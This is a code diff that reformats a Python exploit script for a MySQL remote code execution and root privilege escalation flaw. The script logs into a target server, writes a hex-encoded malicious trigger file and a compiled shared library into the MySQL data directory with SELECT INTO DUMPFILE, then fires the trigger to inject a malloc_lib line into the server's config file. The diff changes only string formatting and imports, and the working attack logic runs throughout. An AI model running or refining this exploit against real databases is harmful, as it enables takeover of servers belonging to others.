@@ -50,9 +50,10 @@ http://legalhackers.com
 """
 
 import argparse
-import mysql.connector
 import binascii
 import subprocess
+
+import mysql.connector
 
 
 def info(str):
@@ -114,8 +115,7 @@ args = parser.parse_args()
 # Connect to database. Provide a user with CREATE TABLE, SELECT and FILE permissions
 # CREATE requirement could be bypassed (malicious trigger could be attached to existing tables)
 info(
-    "Connecting to target server %s and target mysql account '%s@%s' using DB '%s'"
-    % (args.TARGET_HOST, args.TARGET_USER, args.TARGET_HOST, args.TARGET_DB)
+    "Connecting to target server {} and target mysql account '{}@{}' using DB '{}'".format(args.TARGET_HOST, args.TARGET_USER, args.TARGET_HOST, args.TARGET_DB)
 )
 try:
     dbconn = mysql.connector.connect(
@@ -154,7 +154,7 @@ process = subprocess.Popen(
 (result, error) = process.communicate()
 rc = process.wait()
 if rc != 0:
-    errmsg("Failed to compile mysql_hookandroot_lib.so: %s" % cmd)
+    errmsg("Failed to compile mysql_hookandroot_lib.so: {}".format(cmd))
     print(error)
     shutdown(2)
 
@@ -186,43 +186,42 @@ BEGIN
 malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'
 
 [abyss]
-" INTO void;   
+" INTO void;
    set global general_log = off;
 
 END; //
 DELIMITER ;
 """
 trigger_payload = """TYPE=TRIGGERS
-triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'
+triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'{}\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'{}\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'
 sql_modes=0
 definers='root@localhost'
 client_cs_names='utf8'
 connection_cl_names='utf8_general_ci'
 db_cl_names='latin1_swedish_ci'
-""" % (args.TARGET_MYCNF, malloc_lib_path)
+""".format(args.TARGET_MYCNF, malloc_lib_path)
 
 # Convert trigger into HEX to pass it to unhex() SQL function
 trigger_payload_hex = "".join("{:02x}".format(ord(c)) for c in trigger_payload)
 
 # Save trigger into a trigger file
-TRG_path = "/var/lib/mysql/%s/poctable.TRG" % args.TARGET_DB
-info("Saving trigger payload into %s" % (TRG_path))
+TRG_path = "/var/lib/mysql/{}/poctable.TRG".format(args.TARGET_DB)
+info("Saving trigger payload into {}".format(TRG_path))
 try:
     cursor = dbconn.cursor()
     cursor.execute(
-        """SELECT unhex("%s") INTO DUMPFILE '%s' """ % (trigger_payload_hex, TRG_path)
+        """SELECT unhex("{}") INTO DUMPFILE '{}' """.format(trigger_payload_hex, TRG_path)
     )
 except mysql.connector.Error as err:
     errmsg("Something went wrong: {}".format(err))
     shutdown(4)
 
 # Save library into a trigger file
-info("Dumping shared library into %s file on the target" % malloc_lib_path)
+info("Dumping shared library into {} file on the target".format(malloc_lib_path))
 try:
     cursor = dbconn.cursor()
     cursor.execute(
-        """SELECT unhex("%s") INTO DUMPFILE '%s' """
-        % (hookandrootlib_hex, malloc_lib_path)
+        """SELECT unhex("{}") INTO DUMPFILE '{}' """.format(hookandrootlib_hex, malloc_lib_path)
     )
 except mysql.connector.Error as err:
     errmsg("Something went wrong: {}".format(err))
@@ -240,8 +239,7 @@ except mysql.connector.Error as err:
 # Finally, execute the trigger's payload by inserting anything into `poctable`.
 # The payload will write to the mysql config file at this point.
 info(
-    "Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s"
-    % args.TARGET_MYCNF
+    "Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config {}".format(args.TARGET_MYCNF)
 )
 try:
     cursor = dbconn.cursor()
@@ -252,12 +250,11 @@ except mysql.connector.Error as err:
 
 # Check on the config that was just created
 info(
-    "Showing the contents of %s config to verify that our setting (malloc_lib) got injected"
-    % args.TARGET_MYCNF
+    "Showing the contents of {} config to verify that our setting (malloc_lib) got injected".format(args.TARGET_MYCNF)
 )
 try:
     cursor = dbconn.cursor()
-    cursor.execute("SELECT load_file('%s')" % args.TARGET_MYCNF)
+    cursor.execute("SELECT load_file('{}')".format(args.TARGET_MYCNF))
 except mysql.connector.Error as err:
     errmsg("Something went wrong: {}".format(err))
     shutdown(2)
